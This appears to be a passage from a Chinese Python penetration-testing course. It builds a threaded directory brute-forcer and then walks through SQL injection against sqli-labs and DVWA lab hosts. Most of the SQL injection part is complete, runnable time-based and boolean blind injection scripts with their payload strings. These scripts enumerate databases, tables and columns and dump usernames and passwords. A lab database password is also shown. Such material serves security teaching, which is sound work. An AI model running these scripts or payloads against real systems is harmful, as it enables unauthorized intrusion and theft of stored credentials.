parser.add_option("-u", "--url", help="specify the target website URL", action="store", type="string", metavar="URL", dest="url" )

# 5.存储提交的命令⾏参数，如果只添加不存储，那么命令⾏提交的参数也不会进⾏格式化存储
(options, args) = parser.parse_args()

# 6.测试输出传递的命令⾏参数
print(options.url)
```

#### **2.参数获得**

```python
#关键代码
parser = optparse.OptionParser()
parser.usage = "python dir_brute.py -u url -t thread_num -d dic.txt"
parser.add_option(
    "-u", "--url",
    help="specify the target website URL",
    action="store",
    type="string",
    metavar="URL",
    dest="url"
)
parser.add_option(
    "-t", "--threads-num",
    help="custom thread count number",
    action="store",
    type="int",
    metavar="THREADS NUMBER",
    dest="threads_num"
)
parser.add_option(
    "-d", "--dictionary-file",
    help="The dictionary file to be used, not in the current directory, needs to use the full path",
    action="store",
    type="string",
    metavar="DICTIONARY FILE",
    dest="dic_file"
)
(options, args) = parser.parse_args()
url = options.url
threads_num = options.threads_num
dic_file = options.dic_file
print(url)
print(threads_num)
print(dic_file)
```

### **四、字典⽂件读取**

#### **1.Python字典⽂件读取**

```python
with open(filename, mode) as f
	f.readlines()
```

#### **2.多线程思路**

要进⾏**⽬录枚举**，它核⼼意义就是暴⼒破解。暴⼒破解就需要读取⼤量的字典⽂件内容，这个内容是⾮常多的。

如果仅仅是使⽤**单线程**，必然速度是⾮常慢的，这时候可以考虑使⽤**多线程**，来进⾏对应的暴⼒破解。

那⼯具中就要有多线程的接⼝去运⾏多线程破解。⼯具的多线程思路就在于，⼀个线程读取固定数⽬的字典⽂件内容，从⽽均分字典⽂件内容。这时候就需要制作多线程使⽤的字典列表，字典是⼀个总的列表，⾥⾯存储都是以列表格式保存⼀部分字典内容，每个线程读取⼀个列表。

### **五、多线程访问**

#### **1.Python线程池threadpool**

在CMD命令⾏中安装线程池threadpool库

```python
#安装threadpool
conda activate pentest
pip install threadpool
```

threadpool⽤法

```python
import threadpool
#创建⼀个线程池
pool = threadpool.ThreadPool(num)
#调⽤makeRequests创建请求，callable是线程要调⽤的函数，list_of_args是给调⽤函数传递的参数列表，callback是回调函数，默认⽆
requests_list = threadpool.makeRequests(callable, list_of_args, callback)

#把运⾏多线程的函数放⼊线程池中
for req in requests_list:
	pool.putRequest(req)
#等待所有的线程完成⼯作后退出
pool.wait()
```

线程数是通过命令⾏参数获取到的⾃定义数字，它定义了线程池中共有多少个线程；

将所有的线程请求添加到 requests_list 中，然后在线程池中循环启动它们；

其中， callable 表示要调⽤的函数， list_of_args 是调⽤函数是需要传的参数列表。

#### **2.线程池实现**

通过将读取到的字典列表发送到 scan_callback 函数，和url进⾏拼接，实现对⽬录的扫描。

```python
#扫描函数
def scan_callback(path):
    # 实现扫描功能
    try:
        resp = requests.get(url + "/" + path.strip())
        if resp.status_code == 200:
            print(resp.url + " : " + str(resp.status_code))
    except Exception as e:
        pass
		# print(url + "/" + path.strip() + " : 请求失败")
def multi_threads_scan():
	# 定义线程池
	t_pool = threadpool.ThreadPool(threads_num)
    # 打开字典⽂件，读出内容为列表，Windows下默认字符集是gbk，需要编码为utf8，否则乱码
    f = open(dic_file, "r", encoding="utf8")
    lines = f.readlines()
    # 构建线程池中的请求列表
    requests_list = threadpool.makeRequests(scan_callback, lines)
    # 循环请求列表⾥的请求，在池⼦中执⾏这些请求
    for req in requests_list:
        t_pool.putRequest(req)
    t_pool.wait()
    f.close()
```

### **六、完整代码**

```python
import optparse
import threadpool
import requests
parser = optparse.OptionParser()
parser.usage = "python dir_brute.py -u url -t thread_num -d dic.txt"
parser.add_option(
    "-u", "--url",
    help="specify the target website URL",
    action="store",
    type="string",
    metavar="URL",
    dest="url"
)
parser.add_option(
    "-t", "--threads-num",
    help="custom thread count number",
    action="store",
    type="int",
    metavar="THREADS NUMBER",
    dest="threads_num"
)
parser.add_option(
    "-d", "--dictionary-file",
    help="The dictionary file to be used, not in the current directory, needs to use the 
    full path",
    action="store",
    type="string",
    metavar="DICTIONARY FILE",
    dest="dic_file"
)
(options, args) = parser.parse_args()
url = options.url
threads_num = options.threads_num
dic_file = options.dic_file
# print(url)
# print(threads_num)
# print(dic_file)
def banner():
    print("*" * 51)
    print("*" * 2 + " " * 17 + "Dirbrute v1.0" + " " * 17 + "*" * 2)
    print("*" * 51)
    print("This tool just develop for education!")
def usage():
    print("This is the tool's usage")
    print("python dir_brute.py -u url -t thread_num -d dic.txt")
    
def scan_callback(path):
# 实现扫描功能
    try:
        resp = requests.get(url + "/" + path.strip())
        if resp.status_code == 200:
        	print(resp.url + " : " + str(resp.status_code))
    except Exception as e:
    	pass
    	# print(url + "/" + path.strip() + " : 请求失败")
def multi_threads_scan():
    # 定义线程池
    t_pool = threadpool.ThreadPool(threads_num)
    # 打开字典⽂件，读出内容为列表
    f = open(dic_file, "r", encoding="utf8")
    lines = f.readlines()
    # 构建线程池中的请求列表
    requests_list = threadpool.makeRequests(scan_callback, lines)
    # 循环请求列表⾥的请求，在池⼦中执⾏这些请求
    for req in requests_list:
    	t_pool.putRequest(req)
    t_pool.wait()
    f.close()
    
banner()
usage()
multi_threads_scan()
```

#### 测试结果

```bash
(pentest) >python dir_brute.py -u http://192.168.3.105 -t 10 -d dic.txt
***************************************************
** Dirbrute v1.0 **
***************************************************
This tool just develop for education!
This is the tool's usage
python dir_brute.py -u url -t thread_num -d dic.txt
http://192.168.3.105/brute/ : 200
http://192.168.3.105/dvwa/login.php : 200
http://192.168.3.105/dashboard/ : 200
http://192.168.3.105/favicon.ico : 200
http://192.168.3.105/img/ : 200
```

## **第⼗⼀节** **Python SQL注⼊**

### **⼀、SQL注⼊介绍**

#### **1.什么是SQL注⼊**

由于⽤户输⼊的内容被拼接成完整的SQL语句，当⽤户访问时，SQL语句通过后端程序完成执⾏，并且执⾏过程中

带⼊了⼀些其他原本程序没有涉及到的SQL关键字或语句，从⽽造成了SQL注⼊。

#### **2.SQL注⼊的危害**

对于SQL注⼊，它是危害及其严重的Web应⽤程序漏洞，只要有SQL拼接的过程并执⾏，那么就存在SQL注⼊的漏洞，它可能造成以下的⼀些危害：

> 1.榨取数据
>
> 2.执⾏系统命令
>
> 3.向数据库插⼊代码
>
> 4.绕过登录验证

当然，以上不是全部的危害，这⾥只是列举了四项，还有其他危害，每⼀项危害都会对信息系统造成极⼤的损失。

### **⼆、SQL注⼊--基于时间的盲注**

#### **1.什么是基于时间的盲注**

当根据⻚⾯返回的内容不能判断出任何信息时，使⽤条件语句查看时间延迟语句是否执⾏， 也就是看⻚⾯返回时间

是否增⻓来判断是否执⾏。

#### **2.安装sqli-labs**

注意：sqli-labs依赖PHP 5.6环境，需要安装xampp 5.6.40

```bash
#下载，解压后将sqli-labs⽬录移到/opt/lamp/htdocs/下
wget https://github.com/Audi-1/sqli-labs/archive/refs/heads/master.zip

#配置mysql连接信息
vi ./sql-connection/db-creds.inc
$dbuser ='dvwa';
$dbpass ='passw0rd';
$dbname ="security";
$host = 'localhost';
$dbname1 = "challenges";
```

#### **3.⼯具思路**

在已知的URL中添加SQL函数sleep()，如果访问结果返回超时超过sleep函数设定的时间，那么可以判断当前URL具

有SQL注⼊点，由此可知，要进⾏探测，⾸先要获取测试URL，然后对URL中指定位置的参数进⾏模糊测试FUZZ。

#### **4.拼接URL**

根据测试访问超时进⾏判断，例如给URL加⼊

```mysql
"?id=1'+and+if(1=1,sleep(5),1)--+"
```

如果⽹⻚等待了5秒以上才返回内容，则说明URL传递参数的值带⼊了SQL语句，并且执⾏了。它是我们在URL中故

意构造了⼀个参数内容，使得数据库睡眠5秒后才返回数据，由此表明，当前的URL存在SQL注⼊漏洞。

#### **5.使⽤python实现**

对于拼接好的URL进⾏HTTP GET请求，请求之后如果**等待**了指定秒数超时时间，才得到响应数据，那么就存在**SQL注⼊**，如果没有超时⽴⻢返回数据，就表明SQL不存在注⼊漏洞。

```python
import requests
url = "http://192.168.70.14:8088/Less-9/"
test_url_args = "?id=1'+and+if(1=1,sleep(5),1)+--+"
# 测试URL是否存在SQL注⼊点
try:
	resp = requests.get(url + test_url_args, timeout=3)
	#print(resp.text)
except Exception as e:
	# print(e)
	print("存在SQL注⼊漏洞")
```

#### **6.探测数据库名**

如果当前URL存在SQL注⼊漏洞，那么更改注⼊的SQL语句结构，使其可以探测到当前使⽤的数据库名称。

要想获取数据库名称，⾸先要获取数据库名称的⻓度。

```python
# 如果存在SQL注⼊点，则测试它当前使⽤数据库名字的⻓度
get_dbname_len = 0
while True:
	get_dbname_len = get_dbname_len + 1
	dbname_len_url = url + "?id=1'+and+if(length(database())+=+" + str(get_dbname_len) +",sleep(5),1)+--+"
    try:
        resp = requests.get(dbname_len_url, timeout=3)
        print(resp.text)
    except Exception as e:
        print(get_dbname_len)
        break
```

然后根据获取到的数据库名称⻓度，去不断地遍历它每个字符都是什么字⺟或者数字

```PYTHON
# 得到数据库名称的⻓度后，开始循环遍历它每⼀个字符是什么
get_db_name = ""
# 设置所有基础字⺟加数字字符串
base_str = "abcdefghijklmnopqrstuvwxyz0123456789"
# 统计请求次数
count = 0
# 开始遍历数据库名称每个组成的字符
for i in range(get_dbname_len):
# 从⼩写字⺟字符串中遍历每⼀个字⺟
    for letter in base_str:
        get_db_name_url = url + "?id=1'+and+if(substr(database(),"+str(i+1)+",1)='" +letter + "',sleep(5),1)+--+"
        print(get_db_name_url)
        count = count + 1
        try:
            resp = requests.get(get_db_name_url, timeout=3)
            # print(resp.text)
        except Exception as e:
            get_db_name = get_db_name + letter
            print(get_db_name)
            break
print("获取到数据库名称："+get_db_name)
print(f"总共发送了{count}个请求")
```

以上就是利⽤基于时间的SQL盲注，去获取数据库名称的基础实现，当然，还可以获取更多的数据，逻辑是⼀样的，通过不断地去遍历数据的每⼀个字符，去测试⽹⻚是否有等待指定的秒数。



#### 练习

```python
import requests

url = "http://192.168.70.14:8088/Less-9/"
test_url_args = "?id=1'+and+if(1=1,sleep(5),1)+--+"
try:
	resp = requests.get(url + test_url_args, timeout=3)
except Exception as e:
	print("存在SQL注⼊漏洞")

database_name_len = 0

while True:
    database_name_len =database_name_len + 1
    params = f"?id=1' and if(char_length(database())={str(database_name_len)} ,sleep(5),0)--+"
    try:
        requests.get(url + params,timeout=4)
    except Exception as e:
        print(f"当前数据库名称的长度为:{database_name_len}")
        break

base_str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
get_db_name = ""

count = 0
for i in range(database_name_len):
    for letter in base_str:
        get_db_name_url = url + "?id=1'+and+if(substr(database(),"+str(i+1)+",1)='" +letter + "',sleep(5),1)+--+"
        # print(get_db_name_url)
        count = count + 1
        try:
            resp = requests.get(get_db_name_url, timeout=3)
        except Exception as e:
            get_db_name = get_db_name + letter
            # print(get_db_name)
            break
print("获取到数据库名称："+get_db_name)
print(f"总共发送了{count}个请求")
```

### python代码：时间盲注

```python
import requests
import time
import datetime

url = "http://192.168.70.14:8088/Less-9/?id=1'"

def get_dbname():
    dbname = ''
    for i in range(1,9):
        for k in range(32,127):
            payload = "and if(ascii(substr(database(),{0},1))={1},sleep(2),1)--+".format(i,k)
            #if语句里面的sleep(2)为如果注入语句正确就睡眠两秒
            time1 = datetime.datetime.now()
            #获得提交payload之前的时间
            res = requests.get(url + payload)
            time2 = datetime.datetime.now()
            #获得payload提交后的时间
            difference = (time2 - time1).seconds
            #time，time2时间差，seconds是只查看秒
            if difference > 1:
                dbname += chr(k)
            else:
                continue
        print("数据库名为->"+dbname)

def get_table():
    table1 = ''
    table2 = ''
    table3 = ''
    table4 = ''
    for i in range(5):
        for j in range(6):
            for k in range(32,127):
                payload = "and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(2),1)--+"%(i,j,k)
                time1 = datetime.datetime.now()
                res = requests.get(url + payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        table1 += chr(k)
                        print("第一个表为->"+table1)
                    elif i == 1:
                        table2 += chr(k)
                        print("第二个表为->"+table2)
                    elif i == 3:
                        table3 += chr(k)
                        print("第三个表为->"+table3)
                    elif i == 4:
                        table4 += chr(k)
                        print("第四个表为->"+table4)
                    else:
                        break

def get_column():
    column1 = ''
    column2 = ''
    column3 = ''
    for i in range(3):
        for j in range(1,9):
            for k in range(32,127):
                payload = "and if(ascii(substr((select column_name from information_schema.columns where table_name=users and table_schema=database() limit %d,1),%d,1))=%d,sleep(2),1)--+"%(i,j,k)
                time1 = datetime.datetime.now()
                res = requests.get(url+payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        column1 += chr(k)
                        print("字段一为->"+column1)
                    if i == 1:
                        column2 += chr(k)
                        print("字段二为->"+column2)
                    if i == 2:
                        column3 += chr(k)
                        print("字段三为->"+column3)
                    else:
                        break

def get_users():
    user = ''
    for i in range(188):
        for k in range(32,127):
            payload = "and if(ascii(substr((select group_concat(username) from users),%d,1))=%d,sleep(2),1)--+"%(i,k)
            time1 = datetime.datetime.now()
            res = requests.get(url+payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference > 1:
                user += chr(k)
                print("user为->"+user)

if __name__ == '__main__':
    get_dbname()
    get_table()
    get_column()
    get_users()
```

### python代码：布尔盲注

```python
# -*- coding:utf-8 -*-
import requests

'''
布尔盲注脚本，如果HTTP请求结果中包含You are in，代表判断正确

'''
def ascii_str(): #生成库名表名字符所在的字符列表字典
	str_list=[]
	for i in range(33,127): #所有可显示字符的ASCII码
		str_list.append(chr(i))
	#print('可显示字符：%s'%str_list)
	return str_list #返回字符列表

def db_length(url,str):
	print("[-]开始测试数据库名长度.......")
	num=1
	while True:
		db_payload=url+"' and (length(database())=%d)--+"%num
		r=requests.get(db_payload)
		if str in r.text:
			db_length=num
			print("[+]数据库长度：%d\n"%db_length)
			db_name(db_length) #进行下一步，测试库名
			break
		else:
			num += 1

def db_name(db_length):
	print("[-]开始测试数据库名.......")
	db_name=''
	str_list=ascii_str()
	for i in range(1,db_length+1):
		for j in str_list:
			db_payload=url+"' and (ord(mid(database(),%d,1))='%s')--+"%(i,ord(j))
			r=requests.get(db_payload)
			if str in r.text:
				db_name+=j
				break
	print("[+]数据库名：%s\n"%db_name)
	tb_piece(db_name) #进行下一步，测试security数据库有几张表
	return db_name
	
def tb_piece(db_name):
	print("开始测试%s数据库有几张表........"%db_name)
	for i in range(100): #猜解库中有多少张表，合理范围即可
		tb_payload=url+"' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+"%(i,db_name)
		r=requests.get(tb_payload)
		if str in r.text:
			tb_piece=i
			break
	print("[+]%s库一共有%d张表\n"%(db_name,tb_piece))
	tb_name(db_name,tb_piece) #进行下一步，猜解表名


def tb_name(db_name,tb_piece):
	print("[-]开始猜解表名.......")
	table_list=[]
	for i in range(tb_piece):
		str_list=ascii_str()
		tb_length=0
		tb_name=''
		for j in range(1,20): #表名长度，合理范围即可
			tb_payload=url+"' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+"%(i,j)
			r=requests.get(tb_payload)
			if str in r.text:
				tb_length=j
				print("第%d张表名长度：%s"%(i+1,tb_length))
				for k in range(1,tb_length+1): #根据表名长度进行截取对比
					for l in str_list:
						tb_payload=url+"' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+"%(i,k,ord(l))
						r=requests.get(tb_payload)
						if str in r.text:
							tb_name+=l
				print("[+]：%s"%tb_name)
				table_list.append(tb_name)
				break
	print("\n[+]%s库下的%s张表：%s\n"%(db_name,tb_piece,table_list))
	column_num(table_list,db_name) #进行下一步，猜解每张表的字段数

def column_num(table_list,db_name):
	print("[-]开始猜解每张表的字段数：.......")
	column_num_list=[]
	for i in table_list:
		for j in range(30): #每张表的字段数量，合理范围即可
			column_payload=url+"' and %d=(select count(column_name) from information_schema.columns where table_schema='%s' and table_name='%s')--+"%(j,db_name,i)
			r=requests.get(column_payload)
			if str in r.text:
				column_num=j
				column_num_list.append(column_num) #把所有表的字段，依次放入这个列表当中
				print("[+]%s表\t%s个字段"%(i,column_num))
				break
	print("\n[+]表对应的字段数：%s\n"%column_num_list)
	column_name(table_list,column_num_list,db_name) #进行下一步，猜解每张表的字段名

def column_name(table_list,column_num_list,db_name):
	print("[-]开始猜解每张表的字段名.......")
	column_length=[]
	str_list=ascii_str()
	column_name_list=[]
	for t in range(len(table_list)): #t在这里代表每张表的列表索引位置
		print("\n[+]%s表的字段："%table_list[t])
		for i in range(column_num_list[t]): #i表示每张表的字段数量
			column_name=''
			for j in range(1,21): #j表示每个字段的长度
				column_name_length=url+"' and %d=(select length(column_name) from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1)--+"%(j-1,db_name,table_list[t],i)
				#print("pppppppp"+column_name_length)
				r=requests.get(column_name_length)
				if str in r.text:
					column_length.append(j)
					break
				for k in str_list: #k表示我们猜解的字符字典
					column_payload=url+"' and ord(mid((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1))=%d--+"%(db_name,table_list[t],i,j,ord(k))
					r=requests.get(column_payload)
					if str in r.text:
						column_name+=k
			print('[+]：%s'%column_name)
			column_name_list.append(column_name)
	#print(column_name_list)#输出所有表中的字段名到一个列表中
	dump_data(table_list,column_name_list,db_name) #进行最后一步，输出指定字段的数据

def dump_data(table_list,column_name_list,db_name):
	print("\n[-]对%s表的%s字段进行爆破.......\n"%(table_list[3],column_name_list[9:12]))
	str_list=ascii_str()
	for i in column_name_list[9:12]: #id,username,password字段
		data_num = 0
		for j in range(101):#j表示有多少条数据，合理范围即可
			data_num_payload=url+"' and (select count(%s) from %s.%s)=%d--+"%(i,db_name,table_list[3],j)
			#print('pppppppp'+data_num_payload)
			r=requests.get(data_num_payload)
			if str in r.text:
				data_num=j
				break
		print("\n[+]%s表中的%s字段有以下%s条数据："%(table_list[3],i,data_num))
		for k in range(data_num):
			data_len=0
			dump_data=''
			for l in range(1,21):#l表示每条数据的长度，合理范围即可
				data_len_payload=url+"' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+"%(i,db_name,table_list[3],k,l)
				r=requests.get(data_len_payload)
				if str not in r.text:
					data_len=l-1
					for x in range(1,data_len+1):#x表示每条数据的实际范围，作为mid截取的范围
						for y in str_list:
							data_payload=url+"' and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+"%(i,db_name,table_list[3],k,x,ord(y))
							r=requests.get(data_payload)
							if str in r.text:
								dump_data+=y
								break
					break
			print('[+]%s'%dump_data)#输出每条数据



if __name__ == '__main__':
	url="http://192.168.70.14:8088/Less-5/?id=1"#目标url
	str="You are in"#布尔型盲注的true&false的判断因素
	db_length(url,str)#程序入口
```

